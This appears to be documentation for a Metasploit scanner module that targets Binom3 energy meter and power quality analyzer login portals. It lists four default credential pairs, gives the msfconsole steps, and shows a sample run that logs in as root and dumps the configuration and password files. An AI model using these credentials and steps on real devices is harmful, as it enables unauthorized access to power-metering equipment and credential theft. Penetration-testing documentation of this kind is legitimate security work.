This module scans for Binom3 Multifunctional Revenue Energy Meter and Power Quality Analyzer management login portal(s), and attempts to identify valid credentials.
There are four (4) default accounts:

1. root/root
2. admin/1
3. alg/1
4. user/1

In addition to device config, 'root' user can also access password file. Other users - admin, alg, user - can only access configuration file.
The module attempts to download configuration and password files depending on the login user credentials found.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/binom3_login_config_pass_dump```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/http/binom3_login_config_pass_dump
msf auxiliary(binom3_login_config_pass_dump) > set rhosts 1.3.3.7
msf auxiliary(binom3_login_config_pass_dump) > run

[+] 1.3.3.7:80 - Binom3 confirmed...
[*] 1.3.3.7:80 - Trying username:"root" with password:"root"
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "root":"root"
[+] ++++++++++++++++++++++++++++++++++++++
[+] 1.3.3.7 - dumping configuration
[+] ++++++++++++++++++++++++++++++++++++++
[+] 1.3.3.7:80 - File retrieved successfully!
[*] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000003_moduletest_1.3.3.7_Binom3_config_165927.txt
[+] ++++++++++++++++++++++++++++++++++++++
[+] 1.3.3.7 - dumping password file
[+] ++++++++++++++++++++++++++++++++++++++
[+] 1.3.3.7:80 - File retrieved successfully!
[*] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000004_moduletest_1.3.3.7_Binom3_passw_010954.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
